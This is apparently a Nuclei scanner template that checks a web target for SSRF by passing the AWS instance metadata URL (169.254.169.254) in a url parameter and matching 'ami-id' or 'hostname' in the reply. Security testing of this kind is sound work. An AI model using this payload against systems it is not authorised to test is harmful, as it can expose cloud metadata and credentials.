id: ssrf-aws-metadata

info:
  name: SSRF AWS Metadata Access
  severity: critical
  author: reewardius
  tags: ssrf,aws,metadata

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/"

    matchers:
      - type: word
        words:
          - "ami-id"
          - "hostname"
        condition: or
